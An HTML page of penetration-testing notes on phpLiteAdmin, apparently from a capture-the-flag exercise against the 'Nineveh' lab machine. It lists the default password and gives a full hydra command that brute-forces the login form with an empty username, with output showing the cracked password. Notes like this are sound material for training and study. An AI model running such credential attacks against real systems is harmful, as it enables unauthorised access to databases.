@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>phpLiteAdmin</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># phpLiteAdmin</h1></strong><br /><code>phpLiteAdmin</code> is an open-source tool written in PHP that manages <code>SQLite</code> databases.<br /><code>phpMyAdmin</code> is for MySQL, <code>phpLiteAdmin</code> is for <code>SQLite</code>.<br /><br /><strong><h2>## Default password</h2></strong><br /><code>admin</code><br /><br /><strong><h2>## Bruteforce Login Page</h2></strong><br />You can brute-force the login page with <code>hydra</code>.<br /><code>hydra</code> doesn&#39;t normally accept empty usernames, but you can get around it by using a pair of single quotes - <code>&#39;&#39;</code><br /><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/nineveh/443#&nbsp;hydra&nbsp;-v&nbsp;-l&nbsp;&#39;&#39;&nbsp;-P&nbsp;/usr/share/seclists/Passwords/darkweb2017-top1000.txt&nbsp;-o&nbsp;hydra_http-pass.txt&nbsp;-t&nbsp;50&nbsp;10.10.10.43&nbsp;https-post-form&nbsp;&quot;/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:F=Incorrect&nbsp;password.&quot;&nbsp;-f<br />[...]<br />[DATA]&nbsp;max&nbsp;50&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;50&nbsp;tasks,&nbsp;999&nbsp;login&nbsp;tries&nbsp;(l:1/p:0),&nbsp;~999&nbsp;tries&nbsp;per&nbsp;task<br />[DATA]&nbsp;attacking&nbsp;http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:F=Incorrect&nbsp;password.<br />[VERBOSE]&nbsp;Resolving&nbsp;addresses&nbsp;...&nbsp;[VERBOSE]&nbsp;resolving&nbsp;done<br />[443][http-post-form]&nbsp;host:&nbsp;10.10.10.43&nbsp;&nbsp;&nbsp;password:&nbsp;password123<br />[STATUS]&nbsp;attack&nbsp;finished&nbsp;for&nbsp;10.10.10.43&nbsp;(valid&nbsp;pair&nbsp;found)<br />[...]</div></div></div>
+</body>
+</html>
